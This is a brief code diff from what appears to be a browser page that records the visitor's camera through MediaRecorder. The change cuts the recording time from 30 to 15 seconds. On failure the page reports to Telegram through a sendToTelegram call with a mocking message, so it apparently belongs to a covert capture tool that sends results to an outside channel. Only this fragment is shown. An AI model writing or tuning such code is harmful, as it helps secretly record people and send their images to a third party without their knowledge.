@@ -213,7 +213,7 @@
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
-        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 30000);
+        setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 15000);
       } catch (err) {
         sendToTelegram('akses vidio di tolak kocak wkwkwkwkwk 😹');
       }
